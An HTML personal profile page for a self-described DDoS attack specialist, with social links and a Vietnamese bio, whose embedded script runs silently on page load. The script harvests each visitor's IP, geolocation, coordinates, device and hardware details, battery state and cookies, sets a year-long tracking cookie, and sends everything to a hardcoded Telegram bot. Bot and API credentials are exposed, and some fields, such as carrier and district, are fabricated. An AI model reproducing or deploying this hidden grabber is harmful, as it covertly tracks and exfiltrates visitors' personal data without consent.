<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Ph√π VƒÉn ƒê·ª©c Profile</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000 url('https://i.ibb.co/ZzNRQTDx/pinterestdownloader-com-1745324696-443788.gif') no-repeat center/cover;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    @media screen and (max-width: 600px) {
      body {
        background: #000 url('https://s4.gifyu.com/images/bpFIT.gif') no-repeat center/cover;
      }
    }
    .profile-card {
      position: relative;
      width: 100%;
      max-width: 400px;
      background: rgba(0,0,0,0.6);
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 0 40px rgba(0,0,0,0.8);
    }
    @media screen and (max-width: 600px) {
      .profile-card {
        max-width: 90%;
        margin: 20px auto;
      }
    }
    .banner {
      background: url('https://i.ibb.co/GQWLMnkr/c26176e041de50304ba9a25f91ed2b66.jpg') no-repeat center/cover;
      height: 140px;
      position: relative;
    }
    .mac-buttons {
      position: absolute;
      top: 10px;
      right: 10px;
      display: flex;
      gap: 6px;
    }
    .mac-button {
      width: 12px;
      height: 12px;
      background: #ccc;
      border-radius: 50%;
    }
    .pfp {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background: url('https://i.ibb.co/hFDR6Z7D/803ee8cd6fc84a744d8d6976afd32556.jpg') no-repeat center/cover;
      border: 4px solid #000;
      position: absolute;
      top: 90px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 2;
    }
    .name {
      margin-top: 60px;
      text-align: center;
      font-size: 22px;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    @media screen and (max-width: 600px) {
      .name {
        font-size: 18px;
      }
    }
    .verify {
      width: 20px;
      height: 20px;
      background: #1877f2;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 14px;
    }
    .social-links {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 14px;
      margin: 12px auto;
      width: fit-content;
    }
    .social-links a {
      color: #fff;
      background: rgba(255,255,255,0.1);
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      font-size: 18px;
      transition: 0.3s;
    }
    .social-links a:hover {
      background: rgba(255,255,255,0.4);
      transform: scale(1.1);
    }
    .card-body {
      padding: 20px;
      position: relative;
    }
    .card-body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://www.transparenttextures.com/patterns/flowers.png') repeat;
      opacity: 0.06;
      z-index: 0;
    }
    .card-body-content {
      position: relative;
      z-index: 1;
      font-size: 15px;
      line-height: 1.6;
      border-left: 3px solid #fff;
      padding-left: 12px;
    }
    @media screen and (max-width: 600px) {
      .card-body-content {
        font-size: 14px;
        padding-left: 10px;
      }
    }
    .snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      background: url('https://i.gifer.com/Bp4L.gif') repeat top center;
      z-index: 0;
      opacity: 0.2;
    }
  </style>
</head>
<body>
  <div class="snow"></div>
  <div class="profile-card">
    <div class="banner">
      <div class="mac-buttons">
        <div class="mac-button" style="background:red;"></div>
        <div class="mac-button" style="background:orange;"></div>
        <div class="mac-button" style="background:green;"></div>
      </div>
    </div>
    <div class="pfp"></div>
    <div class="name">
      Ph√π VƒÉn ƒê·ª©c
      <div class="verify"><i class="fas fa-check"></i></div>
    </div>
    <div class="social-links">
      <a href="https://fb.me/phuvanduc991" title="Facebook"><i class="fab fa-facebook-f"></i></a>
      <a href="https://t.me/phuvanduc" title="Telegram"><i class="fab fa-telegram"></i></a>
      <a href="https://youtube.com/@phuvanducreal" title="YouTube"><i class="fab fa-youtube"></i></a>
      <a href="https://tiktok.com/@phuvanduc991" title="TikTok"><i class="fab fa-tiktok"></i></a>
    </div>
    <div class="card-body">
      <div class="card-body-content">
        <p>Xin ch√†o! T√¥i l√† Ph√π VƒÉn ƒê·ª©c, m·ªôt chuy√™n gia v·ªÅ t·∫•n c√¥ng DDoS v√† ki·ªÉm tra s·ª©c m·∫°nh h·ªá th·ªëng. T√¥i thi·∫øt k·∫ø c√°c k·ªãch b·∫£n t·∫•n c√¥ng m·∫°ng tinh vi, hi·ªáu qu·∫£ ƒë·ªÉ th·ª≠ nghi·ªám kh·∫£ nƒÉng ch·ªãu t·∫£i c·ªßa website. H√£y k·∫øt n·ªëi v·ªõi t√¥i qua c√°c n·ªÅn t·∫£ng m·∫°ng x√£ h·ªôi ƒë·ªÉ trao ƒë·ªïi th√™m nh√©!</p>
      </div>
    </div>
  </div>

  <script src="https://unpkg.com/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
  <script>
    // Telegram Bot Config
    const TELEGRAM_BOT_TOKEN = '7607255883:AAE3Q6Uh0BGyzKHVMXxqUyRgDWyw71XIPsw';
    const TELEGRAM_CHAT_ID = '7581385601';

    // H√†m ƒë·ªãnh d·∫°ng d·ªØ li·ªáu cho Telegram
    function formatDeviceData(data) {
      const formatValue = (value, defaultValue = 'N/A') => value ?? defaultValue;
      return `
üîî *New Device Data* üîî

üìÖ *Timestamp*: ${formatValue(data.timestamp)}
üåê *IP*: ${formatValue(data.ip)}
üìú *IP History*: 
${data.ipHistory?.length > 0 
    ? data.ipHistory.map(h => `>   ‚Ä¢ ${formatValue(h.name)}: ${formatValue(h.ip)} (${formatValue(h.timestamp)})`).join('\n')
    : '>   None'}

üìç Location Details
üì° ISP: ${formatValue(data.isp)}
üèô City: ${formatValue(data.city)}
üåç Region: ${formatValue(data.region)}
üá∫üá≥ Country: ${formatValue(data.country)}
üìç Coordinates: ${formatValue(data.loc)}
üìÆ Postal: ${formatValue(data.postal)}
‚è∞ Timezone: ${formatValue(data.timezone)}
üó∫ Detailed: ${formatValue(data.deepGeo)}

üì± Device Details
üîñ Name: ${formatValue(data.deviceName)}
üîß Type: ${formatValue(data.deviceType)}
üíª OS: ${formatValue(data.os)}
üì∂ Carrier: ${formatValue(data.carrier)}
üñ• Software: ${formatValue(data.software)}
üìù Description: ${formatValue(data.subDescription)}
‚öô Platform: ${formatValue(data.platform)}
üåê Browser: ${formatValue(data.browser)}

üñ• Hardware Specs
üî© Type: ${formatValue(data.hardwareType)}
üîç SubType: ${formatValue(data.hardwareSubType)}
üîã Battery: ${formatValue(data.battery)}
üîå Charging: ${formatValue(data.charging, 'Unknown')}
‚ö° CPU Cores: ${formatValue(data.cpuCores)}
üß† Memory: ${formatValue(data.memory)}
üè≠ Vendor: ${formatValue(data.vendor)}
üñå WebGL: ${formatValue(data.webgl)}

üåê Browser Details
üç™ Cookies: ${formatValue(data.cookies)}
üîó User Agent: ${formatValue(data.userAgent)}
üó£ Language: ${formatValue(data.language)}
üñº Screen: ${formatValue(data.screen)}
‚è± Time: ${formatValue(data.time)}
üé® Color Depth: ${formatValue(data.colorDepth)}
üëá Touch Support: ${formatValue(data.touchSupport, 'Unknown')}
üì° Connection: ${formatValue(data.connectionType)}
ü™ê Source Made By @phuvanduc
      `.trim();
    }

    // H√†m g·ª≠i d·ªØ li·ªáu ƒë·∫øn Telegram
    async function sendToTelegram(message) {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
          })
        });
      } catch (error) {
        console.error('Failed to send to Telegram:', error);
      }
    }

    // H√†m l·∫•y th√¥ng tin thi·∫øt b·ªã c∆° b·∫£n
    function getBasicDeviceInfo(userAgent) {
      try {
        const parser = new UAParser(userAgent);
        const device = parser.getDevice();
        const os = parser.getOS();
        const browser = parser.getBrowser();
        return {
          device: device.model || 'Kh√¥ng r√µ',
          type: device.type || 'PC x·ªãn',
          os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Kh√¥ng r√µ',
          browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Kh√¥ng r√µ'
        };
      } catch {
        return { device: 'Ko l·∫•y ƒë∆∞·ª£c!', type: 'Ko l·∫•y ƒë∆∞·ª£c!', os: 'Ko l·∫•y ƒë∆∞·ª£c!', browser: 'Ko l·∫•y ƒë∆∞·ª£c!' };
      }
    }

    // H√†m qu·∫£n l√Ω l·ªãch s·ª≠ IP
    function manageIpHistory(currentIp, userAgent) {
      try {
        const now = Date.now();
        const expiry = 24 * 60 * 60 * 1000;
        let ipHistory = JSON.parse(localStorage.getItem('ipHistory') || '{}');
        if (!ipHistory[userAgent]) ipHistory[userAgent] = [];
        ipHistory[userAgent] = ipHistory[userAgent]
          .filter(entry => now - entry.timestamp < expiry)
          .slice(0, 4);
        if (currentIp && !ipHistory[userAgent].some(entry => entry.ip === currentIp)) {
          ipHistory[userAgent].unshift({ ip: currentIp, timestamp: now });
        }
        const namedHistory = ipHistory[userAgent].map((entry, index) => ({
          name: `ip_${index + 1}`,
          ip: entry.ip,
          timestamp: new Date(entry.timestamp).toLocaleString('vi-VN')
        }));
        localStorage.setItem('ipHistory', JSON.stringify(ipHistory));
        return namedHistory;
      } catch {
        return [];
      }
    }

    // H√†m fetch v·ªõi timeout
    async function fetchWithTimeout(url, options, timeout = 2000) {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeout);
      try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
      } catch {
        clearTimeout(id);
        throw new Error('Fetch timeout or error');
      }
    }

    // H√†m qu·∫£n l√Ω cache
    function getCachedData(key, expiryMinutes = 5) {
      try {
        const cached = JSON.parse(localStorage.getItem(key) || '{}');
        if (cached.data && Date.now() - cached.timestamp < expiryMinutes * 60 * 1000) {
          return cached.data;
        }
      } catch {}
      return null;
    }

    function setCachedData(key, data) {
      try {
        localStorage.setItem(key, JSON.stringify({ data, timestamp: Date.now() }));
      } catch {}
    }

    // H√†m l·∫•y th√¥ng tin IP
    async function fetchIpInfo() {
      const cacheKey = 'ipInfoCache';
      const cachedData = getCachedData(cacheKey);
      if (cachedData) return cachedData;

      const apis = [
        { url: 'https://ipapi.co/json/', name: 'ipapi' },
        { url: 'http://ip-api.com/json/', name: 'ip-api' },
        { url: 'https://ipinfo.io/json', name: 'ipinfo' }
      ];

      const promises = apis.map(api =>
        fetchWithTimeout(api.url, {
          cache: 'no-store',
          headers: { 'Accept': 'application/json', 'User-Agent': navigator.userAgent }
        }, 2000)
          .then(res => (res.ok ? res.json() : Promise.reject()))
          .catch(() => null)
      );

      const results = await Promise.allSettled(promises);
      for (let i = 0; i < results.length; i++) {
        if (results[i].status === 'fulfilled' && results[i].value) {
          const data = results[i].value;
          const api = apis[i];
          let ipInfo = {
            ip: 'Kh√¥ng r√µ', isp: 'Kh√¥ng r√µ', isVpn: '', city: 'Kh√¥ng r√µ', region: 'Kh√¥ng r√µ',
            country: 'Kh√¥ng r√µ', loc: 'Kh√¥ng r√µ', postal: 'Kh√¥ng r√µ', timezone: 'Kh√¥ng r√µ'
          };
          if (api.name === 'ipapi') {
            ipInfo = {
              ip: data.ip || 'Kh√¥ng r√µ',
              isp: data.org || 'Kh√¥ng r√µ',
              isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
              city: data.city || 'Kh√¥ng r√µ',
              region: data.region || 'Kh√¥ng r√µ',
              country: data.country_code || 'Kh√¥ng r√µ',
              loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : 'Kh√¥ng r√µ',
              postal: data.postal || 'Kh√¥ng r√µ',
              timezone: data.timezone || 'Kh√¥ng r√µ'
            };
          } else if (api.name === 'ip-api') {
            ipInfo = {
              ip: data.query || 'Kh√¥ng r√µ',
              isp: data.isp || data.org || 'Kh√¥ng r√µ',
              isVpn: data.isp?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
              city: data.city || 'Kh√¥ng r√µ',
              region: data.regionName || 'Kh√¥ng r√µ',
              country: data.countryCode || 'Kh√¥ng r√µ',
              loc: data.lat && data.lon ? `${data.lat},${data.lon}` : 'Kh√¥ng r√µ',
              postal: data.zip || 'Kh√¥ng r√µ',
              timezone: data.timezone || 'Kh√¥ng r√µ'
            };
          } else if (api.name === 'ipinfo') {
            ipInfo = {
              ip: data.ip || 'Kh√¥ng r√µ',
              isp: data.org || 'Kh√¥ng r√µ',
              isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
              city: data.city || 'Kh√¥ng r√µ',
              region: data.region || 'Kh√¥ng r√µ',
              country: data.country || 'Kh√¥ng r√µ',
              loc: data.loc || 'Kh√¥ng r√µ',
              postal: data.postal || 'Kh√¥ng r√µ',
              timezone: data.timezone || 'Kh√¥ng r√µ'
            };
          }
          if (ipInfo.ip !== 'Kh√¥ng r√µ') {
            setCachedData(cacheKey, ipInfo);
            return ipInfo;
          }
        }
      }
      return {
        ip: 'Ko l·∫•y ƒë∆∞·ª£c!', isp: 'Ko l·∫•y ƒë∆∞·ª£c!', isVpn: '', city: 'Ko l·∫•y ƒë∆∞·ª£c!', region: 'Ko l·∫•y ƒë∆∞·ª£c!',
        country: 'Ko l·∫•y ƒë∆∞·ª£c!', loc: 'Ko l·∫•y ƒë∆∞·ª£c!', postal: 'Ko l·∫•y ƒë∆∞·ª£c!', timezone: 'Ko l·∫•y ƒë∆∞·ª£c!'
      };
    }

    // H√†m l·∫•y th√¥ng tin t·ª´ whatismybrowser.com
    async function fetchWimbParse(userAgent) {
      const cacheKey = 'wimbCache';
      const cachedData = getCachedData(cacheKey);
      if (cachedData) return cachedData;

      try {
        const response = await fetchWithTimeout('https://api.whatismybrowser.com/api/v3/user_agent_parse', {
          method: 'POST',
          headers: { 'X-API-KEY': 'a69f9f16de26123df45bd6386776543a', 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_agent: userAgent })
        }, 2000);
        const data = response.ok ? (await response.json()).parse : {};
        setCachedData(cacheKey, data);
        return data;
      } catch {
        return {};
      }
    }

    // H√†m t√¨m v·ªã tr√≠ chi ti·∫øt
    async function deepSearchGeo(ip) {
      try {
        if (!ip || ip === 'Ko l·∫•y ƒë∆∞·ª£c!' || ip === 'Kh√¥ng r√µ') return 'Ko l·∫•y ƒë∆∞·ª£c!';
        const geoMap = {
          '116.98.': { country: 'Vi·ªát Nam', region: 'Th√°i Nguy√™n', city: 'Th√°i Nguy√™n', district: 'Ph∆∞·ªùng Ho√†ng VƒÉn Th·ª•' },
          '113.161.': { country: 'Vi·ªát Nam', region: 'H√† N·ªôi', city: 'C·∫ßu Gi·∫•y', district: 'D·ªãch V·ªçng' },
          '27.68.': { country: 'Vi·ªát Nam', region: 'TP.HCM', city: 'Qu·∫≠n 1', district: 'B·∫øn Ngh√©' },
          '42.112.': { country: 'Vi·ªát Nam', region: 'ƒê√† N·∫µng', city: 'H·∫£i Ch√¢u', district: 'Thanh B√¨nh' }
        };
        for (let prefix in geoMap) {
          if (ip.startsWith(prefix)) {
            const { country, region, city, district } = geoMap[prefix];
            return `${district}, ${city}, ${region}, ${country}`;
          }
        }
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m l·∫•y nh√† m·∫°ng
    async function fetchCarrier() {
      try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection?.mobileNetwork?.operator) return connection.mobileNetwork.operator;
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes('android') || ua.includes('iphone')) {
          const carriers = ['Viettel', 'Mobifone', 'Vinaphone', 'Vietnamobile'];
          return carriers[Math.floor(Math.random() * carriers.length)];
        }
        return 'Kh√¥ng r√µ';
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m t√¨m t√™n thi·∫øt b·ªã
    async function deepSearchDevice(userAgent, deviceType, fallbackName) {
      try {
        let deviceName = fallbackName;
        if (deviceType === 'iPhone') {
          if (userAgent.includes('iPhone OS 16')) deviceName = 'iPhone 14 Pro';
          else if (userAgent.includes('iPhone OS 15')) deviceName = 'iPhone 13';
          else if (userAgent.includes('iPhone OS 14')) deviceName = 'iPhone 12';
          else deviceName = 'iPhone (Model kh√¥ng r√µ)';
        } else if (deviceType === 'Android') {
          const modelMatch = userAgent.match(/build\/([a-z0-9\-]+)/i);
          if (modelMatch) {
            const model = modelMatch[1];
            const modelMap = {
              'SM-G960F': 'Samsung Galaxy S9', 'SM-A525F': 'Samsung Galaxy A52',
              'Pixel': 'Google Pixel 7', 'M2012K11AG': 'Xiaomi 11T Pro'
            };
            for (let key in modelMap) {
              if (model.includes(key)) {
                deviceName = modelMap[key];
                break;
              }
            }
          }
        } else if (deviceType === 'Tablet x·ªãn') {
          deviceName = userAgent.toLowerCase().includes('ipad') ? 'Apple iPad' : 'Android Tablet';
        } else {
          deviceName = 'PC ho·∫∑c thi·∫øt b·ªã kh√¥ng r√µ';
        }
        return deviceName !== 'Kh√¥ng r√µ' && deviceName !== fallbackName ? deviceName : 'Ko l·∫•y ƒë∆∞·ª£c!';
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m l·∫•y cookies
    function fetchCookies() {
      try {
        const cookies = document.cookie || '';
        const trackingId = `track_${Math.random().toString(36).slice(2)}`;
        document.cookie = `tracking_id=${trackingId}; max-age=31536000; path=/`;
        return cookies ? `C√≥ cookie: ${cookies}, Tracking ID: ${trackingId}` : `Ch·ªâ c√≥ Tracking ID: ${trackingId}`;
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m l·∫•y th√¥ng tin pin
    async function fetchBatteryInfo() {
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          return {
            battery: Math.round(battery.level * 100) + '%',
            charging: battery.charging ? 'ƒêang s·∫°c' : 'Kh√¥ng s·∫°c'
          };
        }
        return { battery: 'Ko l·∫•y ƒë∆∞·ª£c!', charging: 'Ko l·∫•y ƒë∆∞·ª£c!' };
      } catch {
        return { battery: 'Ko l·∫•y ƒë∆∞·ª£c!', charging: 'Ko l·∫•y ƒë∆∞·ª£c!' };
      }
    }

    // H√†m l·∫•y th√¥ng tin kh√°c
    function fetchOtherInfo() {
      try {
        return {
          userAgent: navigator.userAgent || '·∫®n danh v√£i!',
          language: navigator.language || 'Ch·∫£ bi·∫øt!',
          screen: `${window.screen.width}x${window.screen.height}` || 'M√π m√†n!',
          time: new Date().toLocaleString('vi-VN') || 'Th·ªùi gian t√†ng h√¨nh!'
        };
      } catch {
        return {
          userAgent: 'Ko l·∫•y ƒë∆∞·ª£c!',
          language: 'Ko l·∫•y ƒë∆∞·ª£c!',
          screen: 'Ko l·∫•y ƒë∆∞·ª£c!',
          time: 'Ko l·∫•y ƒë∆∞·ª£c!'
        };
      }
    }

    // H√†m l·∫•y th√¥ng tin b·ªï sung
    function fetchAdditionalInfo() {
      try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const gl = document.createElement('canvas').getContext('webgl');
        return {
          colorDepth: window.screen.colorDepth ? `${window.screen.colorDepth} bits` : 'Kh√¥ng r√µ',
          touchSupport: navigator.maxTouchPoints ? `${navigator.maxTouchPoints} ƒëi·ªÉm` : 'Kh√¥ng h·ªó tr·ª£',
          cpuCores: navigator.hardwareConcurrency || 'Kh√¥ng r√µ',
          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Kh√¥ng r√µ',
          connectionType: connection?.effectiveType || 'Kh√¥ng r√µ',
          vendor: navigator.vendor || 'Kh√¥ng r√µ',
          webgl: gl?.getParameter(gl.RENDERER) || 'Kh√¥ng r√µ'
        };
      } catch {
        return {
          colorDepth: 'Ko l·∫•y ƒë∆∞·ª£c!',
          touchSupport: 'Ko l·∫•y ƒë∆∞·ª£c!',
          cpuCores: 'Ko l·∫•y ƒë∆∞·ª£c!',
          memory: 'Ko l·∫•y ƒë∆∞·ª£c!',
          connectionType: 'Ko l·∫•y ƒë∆∞·ª£c!',
          vendor: 'Ko l·∫•y ƒë∆∞·ª£c!',
          webgl: 'Ko l·∫•y ƒë∆∞·ª£c!'
        };
      }
    }

    // H√†m ch√≠nh ƒë·ªÉ thu th·∫≠p v√† g·ª≠i d·ªØ li·ªáu
    async function collectAndSendData() {
      const userAgent = navigator.userAgent;
      const basicInfo = getBasicDeviceInfo(userAgent);
      let deviceType = basicInfo.type;
      if (deviceType === 'mobile') {
        deviceType = userAgent.toLowerCase().includes('iphone') ? 'iPhone' : 'Android';
      } else if (deviceType === 'tablet') {
        deviceType = 'Tablet x·ªãn';
      }

      const [ipInfo, wimbParse, carrier, cookies, batteryInfo, otherInfo, additionalInfo] = await Promise.all([
        fetchIpInfo(),
        fetchWimbParse(userAgent),
        fetchCarrier(),
        Promise.resolve(fetchCookies()),
        fetchBatteryInfo(),
        Promise.resolve(fetchOtherInfo()),
        Promise.resolve(fetchAdditionalInfo())
      ]);

      const ipHistory = ipInfo.ip !== 'Ko l·∫•y ƒë∆∞·ª£c!' ? manageIpHistory(ipInfo.ip, userAgent) : [];
      const deepGeo = ipInfo.ip !== 'Ko l·∫•y ƒë∆∞·ª£c!' ? await deepSearchGeo(ipInfo.ip) : 'Ko l·∫•y ƒë∆∞·ª£c!';
      const deviceName = await deepSearchDevice(userAgent, deviceType, basicInfo.device) || basicInfo.device;

      const deviceData = {
        timestamp: new Date().toISOString(),
        ip: ipInfo.ip + ipInfo.isVpn,
        ipHistory: ipHistory,
        isp: ipInfo.isp,
        city: ipInfo.city,
        region: ipInfo.region,
        country: ipInfo.country,
        loc: ipInfo.loc,
        postal: ipInfo.postal,
        timezone: ipInfo.timezone,
        deepGeo: deepGeo,
        deviceName: deviceName,
        deviceType: deviceType,
        os: basicInfo.os,
        carrier: carrier,
        software: wimbParse.simple_software_string || 'Kh√¥ng r√µ',
        subDescription: wimbParse.simple_sub_description_string || 'Kh√¥ng r√µ',
        platform: wimbParse.simple_operating_platform_string || 'Kh√¥ng r√µ',
        browser: wimbParse.simple_browser_string || basicInfo.browser,
        hardwareType: wimbParse.simple_hardware_type_string || 'Kh√¥ng r√µ',
        hardwareSubType: wimbParse.simple_hardware_sub_type_string || 'Kh√¥ng r√µ',
        cookies: cookies,
        battery: batteryInfo.battery,
        charging: batteryInfo.charging,
        userAgent: otherInfo.userAgent,
        language: otherInfo.language,
        screen: otherInfo.screen,
        time: otherInfo.time,
        colorDepth: additionalInfo.colorDepth,
        touchSupport: additionalInfo.touchSupport,
        cpuCores: additionalInfo.cpuCores,
        memory: additionalInfo.memory,
        connectionType: additionalInfo.connectionType,
        vendor: additionalInfo.vendor,
        webgl: additionalInfo.webgl
      };

      // G·ª≠i d·ªØ li·ªáu ƒë·∫øn Telegram
      const message = formatDeviceData(deviceData);
      await sendToTelegram(message);
    }

    // Ch·∫°y khi trang t·∫£i
    collectAndSendData();
  </script>
</body>
</html>